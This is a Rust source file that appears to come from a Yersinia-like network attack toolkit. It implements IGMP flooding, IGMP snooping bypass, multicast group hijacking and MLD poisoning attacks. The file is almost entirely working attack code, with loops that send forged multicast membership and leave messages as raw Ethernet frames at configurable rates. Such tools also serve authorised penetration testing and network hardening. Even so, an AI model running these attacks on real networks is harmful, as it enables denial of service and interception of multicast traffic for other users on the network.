//! IGMP/MLD Attack Implementations

use super::packet::{IgmpPacket, MldPacket};
use async_trait::async_trait;
use std::net::{Ipv4Addr, Ipv6Addr};
use std::sync::atomic::Ordering;
use std::time::Duration;
use tokio::time;
use yersinia_core::{Attack, AttackContext, AttackStats, Result};
use yersinia_packet::{EtherType, EthernetFrame, MacAddress};

/// IGMP Flooding Attack - Multicast Storm
#[derive(Debug, Clone)]
pub struct IgmpFloodingAttack {
    pub multicast_groups: Vec<Ipv4Addr>,
    pub rate_pps: u32,
    pub attack_type: FloodType,
}

#[derive(Debug, Clone, Copy)]
pub enum FloodType {
    MembershipReports,
    Queries,
    LeaveMessages,
}

impl IgmpFloodingAttack {
    pub fn new(rate_pps: u32) -> Self {
        Self {
            multicast_groups: vec![],
            rate_pps,
            attack_type: FloodType::MembershipReports,
        }
    }

    pub fn build_report(&self, group: Ipv4Addr) -> IgmpPacket {
        IgmpPacket::membership_report_v2(group)
    }

    pub fn build_query(&self, group: Ipv4Addr) -> IgmpPacket {
        IgmpPacket::membership_query(group, 100)
    }
}

/// IGMP Snooping Bypass Attack
#[derive(Debug, Clone)]
pub struct IgmpSnoopingBypassAttack {
    pub target_group: Ipv4Addr,
    pub spoofed_source: Option<Ipv4Addr>,
}

impl IgmpSnoopingBypassAttack {
    pub fn new(target_group: Ipv4Addr) -> Self {
        Self {
            target_group,
            spoofed_source: None,
        }
    }

    pub fn build_fake_report(&self) -> IgmpPacket {
        IgmpPacket::membership_report_v2(self.target_group)
    }
}

/// Multicast Group Hijacking Attack
#[derive(Debug, Clone)]
pub struct MulticastGroupHijackAttack {
    pub hijacked_groups: Vec<Ipv4Addr>,
    pub attacker_ip: Ipv4Addr,
}

impl MulticastGroupHijackAttack {
    pub fn new(attacker_ip: Ipv4Addr) -> Self {
        Self {
            hijacked_groups: vec![],
            attacker_ip,
        }
    }

    pub fn build_join(&self, group: Ipv4Addr) -> IgmpPacket {
        IgmpPacket::membership_report_v2(group)
    }

    pub fn build_leave_for_others(&self, group: Ipv4Addr) -> IgmpPacket {
        IgmpPacket::leave_group(group)
    }
}

/// MLD Poisoning Attack (IPv6)
#[derive(Debug, Clone)]
pub struct MldPoisoningAttack {
    pub target_groups: Vec<Ipv6Addr>,
    pub rate_pps: u32,
}

impl MldPoisoningAttack {
    pub fn new(rate_pps: u32) -> Self {
        Self {
            target_groups: vec![],
            rate_pps,
        }
    }

    pub fn build_fake_report(&self, group: Ipv6Addr) -> MldPacket {
        MldPacket::report(group)
    }

    pub fn build_done(&self, group: Ipv6Addr) -> MldPacket {
        MldPacket::done(group)
    }
}

#[async_trait]
impl Attack for IgmpFloodingAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        let groups: Vec<_> = if self.multicast_groups.is_empty() {
            (224..=239).map(|b| Ipv4Addr::new(b, 0, 0, 1)).collect()
        } else {
            self.multicast_groups.clone()
        };

        let mut idx = 0;
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let group = groups[idx % groups.len()];
            let igmp_bytes = match self.attack_type {
                FloodType::MembershipReports => self.build_report(group).to_bytes(),
                FloodType::Queries => self.build_query(group).to_bytes(),
                FloodType::LeaveMessages => IgmpPacket::leave_group(group).to_bytes(),
            };

            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x01]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                igmp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            idx += 1;
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "IGMP Flooding"
    }
}

#[async_trait]
impl Attack for IgmpSnoopingBypassAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(500);
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let igmp_bytes = self.build_fake_report().to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x01]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv4,
                igmp_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "IGMP Snooping Bypass"
    }
}

#[async_trait]
impl Attack for MulticastGroupHijackAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_millis(300);
        let groups: Vec<_> = if self.hijacked_groups.is_empty() {
            vec![Ipv4Addr::new(239, 255, 255, 250)]
        } else {
            self.hijacked_groups.clone()
        };

        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            for group in &groups {
                let join_bytes = self.build_join(*group).to_bytes();
                let frame = EthernetFrame::new(
                    MacAddress([0x01, 0x00, 0x5E, 0x00, 0x00, 0x01]),
                    MacAddress(ctx.interface.mac_address.0),
                    EtherType::IPv4,
                    join_bytes,
                );
                let _ = ctx.interface.send_raw(&frame.to_bytes());
                ctx.stats.increment_packets_sent();
            }
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "Multicast Group Hijacking"
    }
}

#[async_trait]
impl Attack for MldPoisoningAttack {
    async fn execute(&self, ctx: AttackContext) -> Result<()> {
        let interval = Duration::from_micros(1_000_000 / self.rate_pps.max(1) as u64);
        let groups: Vec<_> = if self.target_groups.is_empty() {
            vec![Ipv6Addr::new(0xff02, 0, 0, 0, 0, 0, 0, 1)]
        } else {
            self.target_groups.clone()
        };

        let mut idx = 0;
        while ctx.running.load(Ordering::Relaxed) {
            while ctx.paused.load(Ordering::Relaxed) && ctx.running.load(Ordering::Relaxed) {
                time::sleep(Duration::from_millis(100)).await;
            }
            if !ctx.running.load(Ordering::Relaxed) {
                break;
            }

            let group = groups[idx % groups.len()];
            let mld_bytes = self.build_fake_report(group).to_bytes();
            let frame = EthernetFrame::new(
                MacAddress([0x33, 0x33, 0x00, 0x00, 0x00, 0x01]),
                MacAddress(ctx.interface.mac_address.0),
                EtherType::IPv6,
                mld_bytes,
            );
            if ctx.interface.send_raw(&frame.to_bytes()).is_err() {
                ctx.stats.increment_errors();
            } else {
                ctx.stats.increment_packets_sent();
            }
            idx += 1;
            time::sleep(interval).await;
        }
        Ok(())
    }
    fn pause(&self) {}
    fn resume(&self) {}
    fn stop(&self) {}
    fn stats(&self) -> AttackStats {
        AttackStats::default()
    }
    fn name(&self) -> &str {
        "MLD Poisoning"
    }
}
